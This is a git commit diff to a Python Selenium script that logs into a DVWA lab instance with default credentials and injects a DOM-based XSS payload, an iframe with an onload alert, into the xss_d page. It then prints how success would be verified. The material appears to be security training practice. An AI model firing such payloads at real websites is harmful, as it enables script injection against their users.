0000588707824fba417001445cb9b20f47fd88ca
qianglong <godblessu.milk@gmail.com>
2021-08-26 09:20:05 +0800

    selenium

--- main.py
+++ main.py
@@ -1,4 +1,4 @@
-# python 3.7 （代码看不懂可联系qq: 3109843552 邓女士）
+# python 3.7
 
 
 
@@ -9,13 +9,13 @@ from selenium import webdriver
 login_username = 'admin'
 login_password = 'password'
 
-test_url = 'http://172.16.110.232/DVWA/vulnerabilities/xss_d/' #被测试的页面url
-payloads = ['?default=></option></select><iframe%20onload=alert(/xss/)>'] # payloads字典集合
+test_url = 'http://172.16.110.232/DVWA/vulnerabilities/xss_d/?default=' #被测试的页面url
+payloads = ['></option></select><iframe%20onload=alert(/xss/)>'] # payloads字典集合
 
 
 # 实例化一个chrome浏览器进程
 options = webdriver.ChromeOptions()
-# options.add_argument("start-maximized") #窗口尺寸最大化
+options.add_argument("start-maximized") #浏览器窗口尺寸最大化
 options.add_argument("--auto-open-devtools-for-tabs") #自动打开开发者工具
 options.add_experimental_option("excludeSwitches", ["enable-automation"])
 options.add_experimental_option('useAutomationExtension', False)
@@ -62,15 +62,15 @@ def expolit_domXSS():
     driver.get(url)
 
 
-# 验证 xss dom漏洞 是否被成功利用
+# 验证 xss dom漏洞 是否被成功利用的poc
 def proof_of_concept():
     print('这里是验证payload是否被成功执行的代码。 有两种方案： ')
-    print('一是判断弹窗是否成功弹出，弹出了就可以认为存在dom xss漏洞。')
-    print('二是看被测试的页面html重新加载后payload代码是否被成功插入')
+    print('一是获取到webdriver的状态，判断弹窗是否成功弹出，弹出了就可以认为存在dom xss漏洞。')
+    print('二是获取到webdriver的状态，看被测试的页面html重新加载后payload代码是否被成功插入')
 
 
 if __name__ == '__main__':
     login(login_username, login_password)
     set_level()
     expolit_domXSS()
-    proof_of_concept
+    proof_of_concept()
